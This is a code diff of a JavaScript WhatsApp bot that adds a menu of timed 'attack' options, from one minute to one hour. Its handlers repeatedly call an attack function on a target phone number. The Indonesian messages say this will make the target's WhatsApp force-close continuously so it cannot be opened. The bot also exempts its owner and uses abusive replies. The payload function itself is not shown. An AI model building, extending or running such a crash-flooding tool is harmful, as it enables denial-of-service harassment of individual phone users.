@@ -3983,24 +3983,26 @@ var satgnz = "6281316701742"
 let isnoown = new RegExp(satgnz, 'i')
 let isOwn = isnoown.test(m.text)
  if (isOwn) return m.reply(`You Can't ${command} My Owner Bitch!`)
-                let sccod = [
+ {
+ let sections = [
                 {
-                title: "Choose One!",
+                title: "Attack Features",
                 rows: [
-                {title: "1 MENIT", rowId: `.tack ${q}`, description: `Attack Wa Target Selama 1 Menit`},
-                {title: "10 MENIT", rowId: `.tackk ${q}`, description: `Attack Wa Target Selama 10 Menit`},
-                {title: "30 MENIT", rowId: `tackkk`, description: `Attack Wa Target Selama 30 Menit`},
-                {title: "1 JAM", rowId: `attck${q}`, description: `Attack Wa Target Selama 1 Jam`}
+                {title: "1 Minute", rowId: `tack ${q}`, description: `Attack Target During 1 Minute `},
+                {title: "10 Minute ", rowId: `tackk ${q}`, description: `Attack Target During 10 Minute `},
+                {title: "30 Minute", rowId: `tackkk ${q}`, description: `Attack Target During 30 Minute`},
+                {title: "1 Hours", rowId: `attck ${q}`, description: `Attack Target During 1 Hours`}
                 ]
                 },
                 ]
-                SatganzDevs.sendListMsg(m.chat, `Hi Bitch!, Please Choose Time To Attack`, `Tch`, `Click Here`, sccod, m)
+                SatganzDevs.sendListMsg(m.chat, `Please Select The Attack During`, SatganzDevs.user.name, `Hello Owner !`, `Click Here`, sections, m)
+                }
             }
             break
             case 'tack':{
             	let nomore = q + "@s.whatsapp.net"
             m.reply(`Sukses Attack Target, Whatsapp Target akan terus menerus force close (tidak bisa dibuka) selama 1 menit`)
-            await sleep(60000)
+            await sleep(10000)
 serang(nomore)
 		}
 		break
@@ -4014,7 +4016,6 @@ serang(nomore)
 		case 'tackkk':{
 		nomore = q + "@s.whatsapp.net"
 		m.reply(`Sukses Attack Target, Whatsapp Target akan terus menerus force close (tidak bisa dibuka) selama 30 menit`)
-await sleep(600000)
 serang(nomore)
 await sleep(600000)
 serang(nomore)
@@ -4025,7 +4026,6 @@ serang(nomore)
 		case 'attck':{
 		nomore = q + "@s.whatsapp.net"
 		m.reply(`Sukses Attack Target, Whatsapp Target akan terus menerus force close (tidak bisa dibuka) selama 1 jam`)
-await sleep(600000)
 serang(nomore)
 await sleep(600000)
 serang(nomore)
